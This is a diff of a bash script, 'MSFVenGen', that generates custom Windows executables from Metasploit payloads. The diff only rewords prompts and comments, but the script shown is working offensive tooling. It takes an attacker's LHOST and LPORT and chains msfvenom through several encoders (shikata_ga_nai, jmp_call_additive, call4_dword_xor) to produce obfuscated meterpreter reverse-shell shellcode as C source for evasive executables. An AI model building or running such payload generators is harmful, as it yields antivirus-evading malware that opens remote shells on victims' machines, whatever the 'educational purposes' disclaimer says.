@@ -1,5 +1,5 @@
 #!/bin/bash
-# This script is for educational purposes only. I am not responsible for your ignorance/stupidity.
+# This script is for educational purposes only!!!
 
 outputDir="/home/lonalore/msfvengen"
 mingwDir="/home/lonalore/.wine/drive_c/MinGW/bin"
@@ -8,41 +8,46 @@ shellDir="$outputDir/ShellCode"
 
 clear
 echo "MSFVenGen - Custom MSFVenom Executable Generator"
+echo
 
 if [ ! -d "$mingwDir" ]; then
   echo "MinGW for Windows not found on this system. Please install it first."
 	exit
 fi
 
-read -p "> LHOST: " ip
-read -p "> LPORT: " lprt
+echo "LHOST?"
+read -p "> " ip
+echo "LPORT?"
+read -p "> " lprt
 echo "We will be using the windows/meterpreter/reverse_X payloads. Which would you like to use?"
 read -p "> windows/meterpreter/reverse_" listenr
-read -p "> How many cycles we encode our shellcode? " enumber
-read -p "> Number of random seed to add some junk to the resulting C code source file: " seed
+echo "How many cycles we encode our shellcode?"
+read -p "> " enumber
+echo "Number of random seed to add some junk to the resulting C code source file:"
+read -p "> " seed
 
 echo
 
 if [ ! -d "$outputDir" ]; then
-  echo "Creating the out folder..."
+  echo "Attempting to create the output folder..."
   mkdir $outputDir
 fi
 
 if [ ! -d "$shellDir" ]; then
-	echo "Creating the ShellCode folder..."
+	echo "Attempting to create the ShellCode folder..."
 	mkdir $shellDir
 fi
 
 if test "$(ls -A "$shellDir")"; then
-	echo "Cleaning out the ShellCode directory"
+	echo "Attempting to clean the ShellCode directory out..."
 	rm $shellDir/*
 fi
 
 cd $metasploitDir
-echo "Generating shellcode..."
+echo "Attempting to generate shell-code..."
 msfvenom -p windows/meterpreter/reverse_${listenr} LHOST=$ip LPORT=$lprt EXITFUNC=process --platform windows -e generic/none -i 1 -a x86 -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/jmp_call_additive -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/call4_dword_xor -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f c -o $shellDir/test.c
 cd $shellDir
-echo "Shellcode generated."
+echo "Shell-code generated."
 echo "Cleaning it up..."
 sed '1d' test.c > aready.c
 echo "unsigned char micro[]=" > var
